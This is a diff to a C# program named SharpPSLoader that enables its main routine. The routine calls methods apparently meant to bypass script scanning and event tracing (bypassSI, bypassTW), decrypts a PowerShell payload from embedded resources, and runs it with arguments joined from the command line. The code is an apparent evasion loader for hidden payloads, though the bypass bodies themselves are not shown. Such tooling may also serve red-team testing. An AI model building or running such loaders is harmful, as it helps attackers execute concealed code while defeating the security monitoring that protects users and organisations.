@@ -313,8 +313,9 @@ namespace SharpPSLoader
                 cmd += argument;
             }
 
+#if DEBUG
             //Console.WriteLine(cmd);
-           
+#endif
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
@@ -354,7 +355,8 @@ namespace SharpPSLoader
         {
             Console.WriteLine("[+] Starting from main! ");
 
-/*            SharpPSLoader psLoader = new SharpPSLoader();
+
+            SharpPSLoader psLoader = new SharpPSLoader();
             psLoader.bypassSI();
             psLoader.bypassTW();
             //Console.ReadLine();
@@ -365,12 +367,13 @@ namespace SharpPSLoader
             {
                 powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, args[0]);
             }
-            
 
-            psLoader.RunPowershell(powershellPayload, args[1]);
+            string argument = String.Join(" ", args.Skip(1));
+            Console.WriteLine(argument);
+            psLoader.RunPowershell(powershellPayload, argument);
 
             // Remove me later! 
-            Console.ReadLine();*/
+            Console.ReadLine();
         }
 
 
